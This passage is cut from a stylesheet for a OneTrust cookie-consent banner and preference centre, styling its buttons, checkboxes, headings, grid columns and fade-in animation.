      #onetrust-pc-sdk button *,
      #onetrust-pc-sdk a[data-parent-id] *,
      #ot-sync-ntfy h3 *,
      #ot-sync-ntfy h4 *,
      #ot-sync-ntfy h6 *,
      #ot-sync-ntfy button *,
      #ot-sync-ntfy a[data-parent-id] * {
        font-size: inherit;
        font-weight: inherit;
        color: inherit
      }

      #onetrust-banner-sdk .ot-hide,
      #onetrust-pc-sdk .ot-hide,
      #ot-sync-ntfy .ot-hide {
        display: none !important
      }

      #onetrust-banner-sdk button.ot-link-btn:hover,
      #onetrust-pc-sdk button.ot-link-btn:hover,
      #ot-sync-ntfy button.ot-link-btn:hover {
        text-decoration: underline;
        opacity: 1
      }

      #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
        padding: 0
      }

      #onetrust-pc-sdk .ot-sdk-container {
        padding-right: 0
      }

      #onetrust-pc-sdk .ot-sdk-row {
        flex-direction: initial;
        width: 100%
      }

      #onetrust-pc-sdk [type=checkbox]:checked,
      #onetrust-pc-sdk [type=checkbox]:not(:checked) {
        pointer-events: initial
      }

      #onetrust-pc-sdk [type=checkbox]:disabled+label::before,
      #onetrust-pc-sdk [type=checkbox]:disabled+label:after,
      #onetrust-pc-sdk [type=checkbox]:disabled+label {
        pointer-events: none;
        opacity: .7
      }

      #onetrust-pc-sdk #vendor-list-content {
        transform: translate3d(0, 0, 0)
      }

      #onetrust-pc-sdk li input[type=checkbox] {
        z-index: 1
      }

      #onetrust-pc-sdk li .ot-checkbox label {
        z-index: 2
      }

      #onetrust-pc-sdk li .ot-checkbox input[type=checkbox] {
        height: auto;
        width: auto
      }

      #onetrust-pc-sdk li .host-title a,
      #onetrust-pc-sdk li .ot-host-name a,
      #onetrust-pc-sdk li .accordion-text,
      #onetrust-pc-sdk li .ot-acc-txt {
        z-index: 2;
        position: relative
      }

      #onetrust-pc-sdk input {
        margin: 3px .1ex
      }

      #onetrust-pc-sdk .pc-logo,
      #onetrust-pc-sdk .ot-pc-logo {
        height: 60px;
        width: 180px;
        background-position: center;
        background-size: contain;
        background-repeat: no-repeat;
        display: inline-flex;
        justify-content: center;
        align-items: center
      }

      #onetrust-pc-sdk .pc-logo img,
      #onetrust-pc-sdk .ot-pc-logo img {
        max-height: 100%;
        max-width: 100%
      }

      #onetrust-pc-sdk .screen-reader-only,
      #onetrust-pc-sdk .ot-scrn-rdr,
      .ot-sdk-cookie-policy .screen-reader-only,
      .ot-sdk-cookie-policy .ot-scrn-rdr {
        border: 0;
        clip: rect(0 0 0 0);
        height: 1px;
        margin: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px
      }

      #onetrust-pc-sdk.ot-fade-in,
      .onetrust-pc-dark-filter.ot-fade-in,
      #onetrust-banner-sdk.ot-fade-in {
        animation-name: onetrust-fade-in;
        animation-duration: 400ms;
        animation-timing-function: ease-in-out
      }

      #onetrust-pc-sdk.ot-hide {
        display: none !important
      }

      .onetrust-pc-dark-filter.ot-hide {
        display: none !important
      }

      #ot-sdk-btn.ot-sdk-show-settings,
      #ot-sdk-btn.optanon-show-settings {
        color: #68b631;
        border: 1px solid #68b631;
        height: auto;
        white-space: normal;
        word-wrap: break-word;
        padding: .8em 2em;
        font-size: .8em;
        line-height: 1.2;
        cursor: pointer;
        -moz-transition: .1s ease;
        -o-transition: .1s ease;
        -webkit-transition: 1s ease;
        transition: .1s ease
      }

      #ot-sdk-btn.ot-sdk-show-settings:hover,
      #ot-sdk-btn.optanon-show-settings:hover {
        color: #fff;
        background-color: #68b631
      }

      .onetrust-pc-dark-filter {
        background: rgba(0, 0, 0, .5);
        z-index: 2147483646;
        width: 100%;
        height: 100%;
        overflow: hidden;
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0
      }

      @keyframes onetrust-fade-in {
        0% {
          opacity: 0
        }

        100% {
          opacity: 1
        }
      }

      .ot-cookie-label {
        text-decoration: underline
      }

      @media only screen and (min-width: 426px)and (max-width: 896px)and (orientation: landscape) {
        #onetrust-pc-sdk p {
          font-size: .75em
        }
      }

      #onetrust-banner-sdk .banner-option-input:focus+label {
        outline: 1px solid #000;
        outline-style: auto
      }

      .category-vendors-list-handler+a:focus,
      .category-vendors-list-handler+a:focus-visible {
        outline: 2px solid #000
      }

      #onetrust-pc-sdk .ot-userid-title {
        margin-top: 10px
      }

      #onetrust-pc-sdk .ot-userid-title>span,
      #onetrust-pc-sdk .ot-userid-timestamp>span {
        font-weight: 700
      }

      #onetrust-pc-sdk .ot-userid-desc {
        font-style: italic
      }

      #onetrust-pc-sdk .ot-host-desc a {
        pointer-events: initial
      }

      #onetrust-pc-sdk .ot-ven-hdr>p a {
        position: relative;
        z-index: 2;
        pointer-events: initial
      }

      #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
      #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info a {
        margin-right: auto
      }

      #onetrust-pc-sdk .ot-pc-footer-logo img {
        width: 136px;
        height: 16px
      }

      #onetrust-banner-sdk .ot-optout-signal,
      #onetrust-pc-sdk .ot-optout-signal {
        border: 1px solid #32ae88;
        border-radius: 3px;
        padding: 5px;
        margin-bottom: 10px;
        background-color: #f9fffa;
        font-size: .85rem;
        line-height: 2
      }

      #onetrust-banner-sdk .ot-optout-signal .ot-optout-icon,
      #onetrust-pc-sdk .ot-optout-signal .ot-optout-icon {
        display: inline;
        margin-right: 5px
      }

      #onetrust-banner-sdk .ot-optout-signal svg,
      #onetrust-pc-sdk .ot-optout-signal svg {
        height: 20px;
        width: 30px;
        transform: scale(0.5)
      }

      #onetrust-banner-sdk .ot-optout-signal svg path,
      #onetrust-pc-sdk .ot-optout-signal svg path {
        fill: #32ae88
      }

      #onetrust-banner-sdk,
      #onetrust-pc-sdk,
      #ot-sdk-cookie-policy,
      #ot-sync-ntfy {
        font-size: 16px
      }

      #onetrust-banner-sdk *,
      #onetrust-banner-sdk ::after,
      #onetrust-banner-sdk ::before,
      #onetrust-pc-sdk *,
      #onetrust-pc-sdk ::after,
      #onetrust-pc-sdk ::before,
      #ot-sdk-cookie-policy *,
      #ot-sdk-cookie-policy ::after,
      #ot-sdk-cookie-policy ::before,
      #ot-sync-ntfy *,
      #ot-sync-ntfy ::after,
      #ot-sync-ntfy ::before {
        -webkit-box-sizing: content-box;
        -moz-box-sizing: content-box;
        box-sizing: content-box
      }

      #onetrust-banner-sdk div,
      #onetrust-banner-sdk span,
      #onetrust-banner-sdk h1,
      #onetrust-banner-sdk h2,
      #onetrust-banner-sdk h3,
      #onetrust-banner-sdk h4,
      #onetrust-banner-sdk h5,
      #onetrust-banner-sdk h6,
      #onetrust-banner-sdk p,
      #onetrust-banner-sdk img,
      #onetrust-banner-sdk svg,
      #onetrust-banner-sdk button,
      #onetrust-banner-sdk section,
      #onetrust-banner-sdk a,
      #onetrust-banner-sdk label,
      #onetrust-banner-sdk input,
      #onetrust-banner-sdk ul,
      #onetrust-banner-sdk li,
      #onetrust-banner-sdk nav,
      #onetrust-banner-sdk table,
      #onetrust-banner-sdk thead,
      #onetrust-banner-sdk tr,
      #onetrust-banner-sdk td,
      #onetrust-banner-sdk tbody,
      #onetrust-banner-sdk .ot-main-content,
      #onetrust-banner-sdk .ot-toggle,
      #onetrust-banner-sdk #ot-content,
      #onetrust-banner-sdk #ot-pc-content,
      #onetrust-banner-sdk .checkbox,
      #onetrust-pc-sdk div,
      #onetrust-pc-sdk span,
      #onetrust-pc-sdk h1,
      #onetrust-pc-sdk h2,
      #onetrust-pc-sdk h3,
      #onetrust-pc-sdk h4,
      #onetrust-pc-sdk h5,
      #onetrust-pc-sdk h6,
      #onetrust-pc-sdk p,
      #onetrust-pc-sdk img,
      #onetrust-pc-sdk svg,
      #onetrust-pc-sdk button,
      #onetrust-pc-sdk section,
      #onetrust-pc-sdk a,
      #onetrust-pc-sdk label,
      #onetrust-pc-sdk input,
      #onetrust-pc-sdk ul,
      #onetrust-pc-sdk li,
      #onetrust-pc-sdk nav,
      #onetrust-pc-sdk table,
      #onetrust-pc-sdk thead,
      #onetrust-pc-sdk tr,
      #onetrust-pc-sdk td,
      #onetrust-pc-sdk tbody,
      #onetrust-pc-sdk .ot-main-content,
      #onetrust-pc-sdk .ot-toggle,
      #onetrust-pc-sdk #ot-content,
      #onetrust-pc-sdk #ot-pc-content,
      #onetrust-pc-sdk .checkbox,
      #ot-sdk-cookie-policy div,
      #ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy h1,
      #ot-sdk-cookie-policy h2,
      #ot-sdk-cookie-policy h3,
      #ot-sdk-cookie-policy h4,
      #ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy img,
      #ot-sdk-cookie-policy svg,
      #ot-sdk-cookie-policy button,
      #ot-sdk-cookie-policy section,
      #ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy label,
      #ot-sdk-cookie-policy input,
      #ot-sdk-cookie-policy ul,
      #ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy nav,
      #ot-sdk-cookie-policy table,
      #ot-sdk-cookie-policy thead,
      #ot-sdk-cookie-policy tr,
      #ot-sdk-cookie-policy td,
      #ot-sdk-cookie-policy tbody,
      #ot-sdk-cookie-policy .ot-main-content,
      #ot-sdk-cookie-policy .ot-toggle,
      #ot-sdk-cookie-policy #ot-content,
      #ot-sdk-cookie-policy #ot-pc-content,
      #ot-sdk-cookie-policy .checkbox,
      #ot-sync-ntfy div,
      #ot-sync-ntfy span,
      #ot-sync-ntfy h1,
      #ot-sync-ntfy h2,
      #ot-sync-ntfy h3,
      #ot-sync-ntfy h4,
      #ot-sync-ntfy h5,
      #ot-sync-ntfy h6,
      #ot-sync-ntfy p,
      #ot-sync-ntfy img,
      #ot-sync-ntfy svg,
      #ot-sync-ntfy button,
      #ot-sync-ntfy section,
      #ot-sync-ntfy a,
      #ot-sync-ntfy label,
      #ot-sync-ntfy input,
      #ot-sync-ntfy ul,
      #ot-sync-ntfy li,
      #ot-sync-ntfy nav,
      #ot-sync-ntfy table,
      #ot-sync-ntfy thead,
      #ot-sync-ntfy tr,
      #ot-sync-ntfy td,
      #ot-sync-ntfy tbody,
      #ot-sync-ntfy .ot-main-content,
      #ot-sync-ntfy .ot-toggle,
      #ot-sync-ntfy #ot-content,
      #ot-sync-ntfy #ot-pc-content,
      #ot-sync-ntfy .checkbox {
        font-family: inherit;
        font-weight: normal;
        -webkit-font-smoothing: auto;
        letter-spacing: normal;
        line-height: normal;
        padding: 0;
        margin: 0;
        height: auto;
        min-height: 0;
        max-height: none;
        width: auto;
        min-width: 0;
        max-width: none;
        border-radius: 0;
        border: none;
        clear: none;
        float: none;
        position: static;
        bottom: auto;
        left: auto;
        right: auto;
        top: auto;
        text-align: left;
        text-decoration: none;
        text-indent: 0;
        text-shadow: none;
        text-transform: none;
        white-space: normal;
        background: none;
        overflow: visible;
        vertical-align: baseline;
        visibility: visible;
        z-index: auto;
        box-shadow: none
      }

      #onetrust-banner-sdk label:before,
      #onetrust-banner-sdk label:after,
      #onetrust-banner-sdk .checkbox:after,
      #onetrust-banner-sdk .checkbox:before,
      #onetrust-pc-sdk label:before,
      #onetrust-pc-sdk label:after,
      #onetrust-pc-sdk .checkbox:after,
      #onetrust-pc-sdk .checkbox:before,
      #ot-sdk-cookie-policy label:before,
      #ot-sdk-cookie-policy label:after,
      #ot-sdk-cookie-policy .checkbox:after,
      #ot-sdk-cookie-policy .checkbox:before,
      #ot-sync-ntfy label:before,
      #ot-sync-ntfy label:after,
      #ot-sync-ntfy .checkbox:after,
      #ot-sync-ntfy .checkbox:before {
        content: "";
        content: none
      }

      #onetrust-banner-sdk .ot-sdk-container,
      #onetrust-pc-sdk .ot-sdk-container,
      #ot-sdk-cookie-policy .ot-sdk-container {
        position: relative;
        width: 100%;
        max-width: 100%;
        margin: 0 auto;
        padding: 0 20px;
        box-sizing: border-box
      }

      #onetrust-banner-sdk .ot-sdk-column,
      #onetrust-banner-sdk .ot-sdk-columns,
      #onetrust-pc-sdk .ot-sdk-column,
      #onetrust-pc-sdk .ot-sdk-columns,
      #ot-sdk-cookie-policy .ot-sdk-column,
      #ot-sdk-cookie-policy .ot-sdk-columns {
        width: 100%;
        float: left;
        box-sizing: border-box;
        padding: 0;
        display: initial
      }

      @media(min-width: 400px) {

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
          width: 90%;
          padding: 0
        }
      }

      @media(min-width: 550px) {

        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
          width: 100%
        }

        #onetrust-banner-sdk .ot-sdk-column,
        #onetrust-banner-sdk .ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-column,
        #onetrust-pc-sdk .ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-column,
        #ot-sdk-cookie-policy .ot-sdk-columns {
          margin-left: 4%
        }

        #onetrust-banner-sdk .ot-sdk-column:first-child,
        #onetrust-banner-sdk .ot-sdk-columns:first-child,
        #onetrust-pc-sdk .ot-sdk-column:first-child,
        #onetrust-pc-sdk .ot-sdk-columns:first-child,
        #ot-sdk-cookie-policy .ot-sdk-column:first-child,
        #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
          margin-left: 0
        }

        #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
          width: 13.3333333333%
        }

        #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
          width: 22%
        }

        #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
          width: 30.6666666667%
        }

        #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
          width: 65.3333333333%
        }

        #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
          width: 74%
        }

        #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
          width: 82.6666666667%
        }

        #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
          width: 91.3333333333%
        }

        #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
          width: 100%;
          margin-left: 0
        }
      }

      #onetrust-banner-sdk h1,
      #onetrust-banner-sdk h2,
      #onetrust-banner-sdk h3,
      #onetrust-banner-sdk h4,
      #onetrust-banner-sdk h5,
      #onetrust-banner-sdk h6,
      #onetrust-pc-sdk h1,
      #onetrust-pc-sdk h2,
      #onetrust-pc-sdk h3,
      #onetrust-pc-sdk h4,
      #onetrust-pc-sdk h5,
      #onetrust-pc-sdk h6,
      #ot-sdk-cookie-policy h1,
      #ot-sdk-cookie-policy h2,
      #ot-sdk-cookie-policy h3,
      #ot-sdk-cookie-policy h4,
      #ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy h6 {
        margin-top: 0;
        font-weight: 600;
        font-family: inherit
      }

      #onetrust-banner-sdk h1,
      #onetrust-pc-sdk h1,
      #ot-sdk-cookie-policy h1 {
        font-size: 1.5rem;
        line-height: 1.2
      }

      #onetrust-banner-sdk h2,
      #onetrust-pc-sdk h2,
      #ot-sdk-cookie-policy h2 {
        font-size: 1.5rem;
        line-height: 1.25
      }

      #onetrust-banner-sdk h3,
      #onetrust-pc-sdk h3,
      #ot-sdk-cookie-policy h3 {
        font-size: 1.5rem;
        line-height: 1.3
      }

      #onetrust-banner-sdk h4,
      #onetrust-pc-sdk h4,
      #ot-sdk-cookie-policy h4 {
        font-size: 1.5rem;
        line-height: 1.35
      }

      #onetrust-banner-sdk h5,
      #onetrust-pc-sdk h5,
      #ot-sdk-cookie-policy h5 {
        font-size: 1.5rem;
        line-height: 1.5
      }

      #onetrust-banner-sdk h6,
      #onetrust-pc-sdk h6,
      #ot-sdk-cookie-policy h6 {
        font-size: 1.5rem;
        line-height: 1.6
      }

      @media(min-width: 550px) {

        #onetrust-banner-sdk h1,
        #onetrust-pc-sdk h1,
        #ot-sdk-cookie-policy h1 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h2,
        #onetrust-pc-sdk h2,
        #ot-sdk-cookie-policy h2 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h3,
        #onetrust-pc-sdk h3,
        #ot-sdk-cookie-policy h3 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h4,
        #onetrust-pc-sdk h4,
        #ot-sdk-cookie-policy h4 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h5,
        #onetrust-pc-sdk h5,
        #ot-sdk-cookie-policy h5 {
          font-size: 1.5rem
        }

        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h6 {
          font-size: 1.5rem
        }
      }

      #onetrust-banner-sdk p,
      #onetrust-pc-sdk p,
      #ot-sdk-cookie-policy p {
        margin: 0 0 1em 0;
        font-family: inherit;
        line-height: normal
      }

      #onetrust-banner-sdk a,
      #onetrust-pc-sdk a,
      #ot-sdk-cookie-policy a {
        color: #565656;
        text-decoration: underline
      }

      #onetrust-banner-sdk a:hover,
      #onetrust-pc-sdk a:hover,
      #ot-sdk-cookie-policy a:hover {
        color: #565656;
        text-decoration: none
      }

      #onetrust-banner-sdk .ot-sdk-button,
      #onetrust-banner-sdk button,
      #onetrust-pc-sdk .ot-sdk-button,
      #onetrust-pc-sdk button,
      #ot-sdk-cookie-policy .ot-sdk-button,
      #ot-sdk-cookie-policy button {
        margin-bottom: 1rem;
        font-family: inherit
      }

      #onetrust-banner-sdk .ot-sdk-button,
      #onetrust-banner-sdk button,
      #onetrust-pc-sdk .ot-sdk-button,
      #onetrust-pc-sdk button,
      #ot-sdk-cookie-policy .ot-sdk-button,
      #ot-sdk-cookie-policy button {
        display: inline-block;
        height: 38px;
        padding: 0 30px;
        color: #555;
        text-align: center;
        font-size: .9em;
        font-weight: 400;
        line-height: 38px;
        letter-spacing: .01em;
        text-decoration: none;
        white-space: nowrap;
        background-color: rgba(0, 0, 0, 0);
        border-radius: 2px;
        border: 1px solid #bbb;
        cursor: pointer;
        box-sizing: border-box
      }

      #onetrust-banner-sdk .ot-sdk-button:hover,
      #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
      #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
      #onetrust-pc-sdk .ot-sdk-button:hover,
      #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
      #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
      #ot-sdk-cookie-policy .ot-sdk-button:hover,
      #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
      #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus {
        color: #333;
        border-color: #888;
        opacity: .7
      }

      #onetrust-banner-sdk .ot-sdk-button:focus,
      #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
      #onetrust-pc-sdk .ot-sdk-button:focus,
      #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
      #ot-sdk-cookie-policy .ot-sdk-button:focus,
      #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus {
        outline: 2px solid #000
      }

      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
      #onetrust-banner-sdk button.ot-sdk-button-primary,
      #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary,
      #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary,
      #onetrust-banner-sdk input[type=button].ot-sdk-button-primary,
      #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
      #onetrust-pc-sdk button.ot-sdk-button-primary,
      #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary,
      #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary,
      #onetrust-pc-sdk input[type=button].ot-sdk-button-primary,
      #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
      #ot-sdk-cookie-policy button.ot-sdk-button-primary,
      #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary,
      #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary,
      #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary {
        color: #fff;
        background-color: #33c3f0;
        border-color: #33c3f0
      }

      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
      #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
      #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary:hover,
      #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary:hover,
      #onetrust-banner-sdk input[type=button].ot-sdk-button-primary:hover,
      #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
      #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
      #onetrust-banner-sdk input[type=submit].ot-sdk-button-primary:focus,
      #onetrust-banner-sdk input[type=reset].ot-sdk-button-primary:focus,
      #onetrust-banner-sdk input[type=button].ot-sdk-button-primary:focus,
      #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
      #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
      #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary:hover,
      #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary:hover,
      #onetrust-pc-sdk input[type=button].ot-sdk-button-primary:hover,
      #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
      #onetrust-pc-sdk button.ot-sdk-button-primary:focus,
      #onetrust-pc-sdk input[type=submit].ot-sdk-button-primary:focus,
      #onetrust-pc-sdk input[type=reset].ot-sdk-button-primary:focus,
      #onetrust-pc-sdk input[type=button].ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy button.ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary:hover,
      #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy button.ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy input[type=submit].ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy input[type=reset].ot-sdk-button-primary:focus,
      #ot-sdk-cookie-policy input[type=button].ot-sdk-button-primary:focus {
        color: #fff;
        background-color: #1eaedb;
        border-color: #1eaedb
      }

      #onetrust-banner-sdk input[type=text],
      #onetrust-pc-sdk input[type=text],
      #ot-sdk-cookie-policy input[type=text] {
        height: 38px;
        padding: 6px 10px;
        background-color: #fff;
        border: 1px solid #d1d1d1;
        border-radius: 4px;
        box-shadow: none;
        box-sizing: border-box
      }

      #onetrust-banner-sdk input[type=text],
      #onetrust-pc-sdk input[type=text],
      #ot-sdk-cookie-policy input[type=text] {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none
      }

      #onetrust-banner-sdk input[type=text]:focus,
      #onetrust-pc-sdk input[type=text]:focus,
      #ot-sdk-cookie-policy input[type=text]:focus {
        border: 1px solid #000;
        outline: 0
      }

      #onetrust-banner-sdk label,
      #onetrust-pc-sdk label,
      #ot-sdk-cookie-policy label {
        display: block;
        margin-bottom: .5rem;
        font-weight: 600
      }

      #onetrust-banner-sdk input[type=checkbox],
      #onetrust-pc-sdk input[type=checkbox],
      #ot-sdk-cookie-policy input[type=checkbox] {
        display: inline
      }

      #onetrust-banner-sdk ul,
      #onetrust-pc-sdk ul,
      #ot-sdk-cookie-policy ul {
        list-style: circle inside
      }

      #onetrust-banner-sdk ul,
      #onetrust-pc-sdk ul,
      #ot-sdk-cookie-policy ul {
        padding-left: 0;
        margin-top: 0
      }

      #onetrust-banner-sdk ul ul,
      #onetrust-pc-sdk ul ul,
      #ot-sdk-cookie-policy ul ul {
        margin: 1.5rem 0 1.5rem 3rem;
        font-size: 90%
      }

      #onetrust-banner-sdk li,
      #onetrust-pc-sdk li,
      #ot-sdk-cookie-policy li {
        margin-bottom: 1rem
      }

      #onetrust-banner-sdk th,
      #onetrust-banner-sdk td,
      #onetrust-pc-sdk th,
      #onetrust-pc-sdk td,
      #ot-sdk-cookie-policy th,
      #ot-sdk-cookie-policy td {
        padding: 12px 15px;
        text-align: left;
        border-bottom: 1px solid #e1e1e1
      }

      #onetrust-banner-sdk button,
      #onetrust-pc-sdk button,
      #ot-sdk-cookie-policy button {
        margin-bottom: 1rem;
        font-family: inherit
      }

      #onetrust-banner-sdk .ot-sdk-container:after,
      #onetrust-banner-sdk .ot-sdk-row:after,
      #onetrust-pc-sdk .ot-sdk-container:after,
      #onetrust-pc-sdk .ot-sdk-row:after,
      #ot-sdk-cookie-policy .ot-sdk-container:after,
      #ot-sdk-cookie-policy .ot-sdk-row:after {
        content: "";
        display: table;
        clear: both
      }

      #onetrust-banner-sdk .ot-sdk-row,
      #onetrust-pc-sdk .ot-sdk-row,
      #ot-sdk-cookie-policy .ot-sdk-row {
        margin: 0;
        max-width: none;
        display: block
      }

      #onetrust-banner-sdk {
        box-shadow: 0 0 18px rgba(0, 0, 0, .2)
      }

      #onetrust-banner-sdk.otFlat {
        position: fixed;
        z-index: 2147483645;
        bottom: 0;
        right: 0;
        left: 0;
        background-color: #fff;
        max-height: 90%;
        overflow-x: hidden;
        overflow-y: auto
      }

      #onetrust-banner-sdk.otFlat.top {
        top: 0px;
        bottom: auto
      }

      #onetrust-banner-sdk.otRelFont {
        font-size: 1rem
      }

      #onetrust-banner-sdk>.ot-sdk-container {
        overflow: hidden
      }

      #onetrust-banner-sdk::-webkit-scrollbar {
        width: 11px
      }

      #onetrust-banner-sdk::-webkit-scrollbar-thumb {
        border-radius: 10px;
        background: #c1c1c1
      }

      #onetrust-banner-sdk {
        scrollbar-arrow-color: #c1c1c1;
        scrollbar-darkshadow-color: #c1c1c1;
        scrollbar-face-color: #c1c1c1;
        scrollbar-shadow-color: #c1c1c1
      }

      #onetrust-banner-sdk #onetrust-policy {
        margin: 1.25em 0 .625em 2em;
        overflow: hidden
      }

      #onetrust-banner-sdk #onetrust-policy .ot-gv-list-handler {
        float: left;
        font-size: .82em;
        padding: 0;
        margin-bottom: 0;
        border: 0;
        line-height: normal;
        height: auto;
        width: auto
      }

      #onetrust-banner-sdk #onetrust-policy-title {
        font-size: 1.2em;
        line-height: 1.3;
        margin-bottom: 10px
      }

      #onetrust-banner-sdk #onetrust-policy-text {
        clear: both;
        text-align: left;
        font-size: .88em;
        line-height: 1.4
      }

      #onetrust-banner-sdk #onetrust-policy-text * {
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-banner-sdk #onetrust-policy-text a {
        font-weight: bold;
        margin-left: 5px
      }

      #onetrust-banner-sdk #onetrust-policy-title,
      #onetrust-banner-sdk #onetrust-policy-text {
        color: dimgray;
        float: left
      }

      #onetrust-banner-sdk #onetrust-button-group-parent {
        min-height: 1px;
        text-align: center
      }

      #onetrust-banner-sdk #onetrust-button-group {
        display: inline-block
      }

      #onetrust-banner-sdk #onetrust-accept-btn-handler,
      #onetrust-banner-sdk #onetrust-reject-all-handler,
      #onetrust-banner-sdk #onetrust-pc-btn-handler {
        background-color: #68b631;
        color: #fff;
        border-color: #68b631;
        margin-right: 1em;
        min-width: 125px;
        height: auto;
        white-space: normal;
        word-break: break-word;
        word-wrap: break-word;
        padding: 12px 10px;
        line-height: 1.2;
        font-size: .813em;
        font-weight: 600
      }

      #onetrust-banner-sdk #onetrust-pc-btn-handler.cookie-setting-link {
        background-color: #fff;
        border: none;
        color: #68b631;
        text-decoration: underline;
        padding-left: 0;
        padding-right: 0
      }

      #onetrust-banner-sdk .onetrust-close-btn-ui {
        width: 44px;
        height: 44px;
        background-size: 12px;
        border: none;
        position: relative;
        margin: auto;
        padding: 0
      }

      #onetrust-banner-sdk .banner_logo {
        display: none
      }

      #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        left: 0px
      }

      #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-policy {
        margin-left: 65px
      }

      #onetrust-banner-sdk .ot-b-addl-desc {
        clear: both;
        float: left;
        display: block
      }

      #onetrust-banner-sdk #banner-options {
        float: left;
        display: table;
        margin-right: 0;
        margin-left: 1em;
        width: calc(100% - 1em)
      }

      #onetrust-banner-sdk .banner-option-input {
        cursor: pointer;
        width: auto;
        height: auto;
        border: none;
        padding: 0;
        padding-right: 3px;
        margin: 0 0 10px;
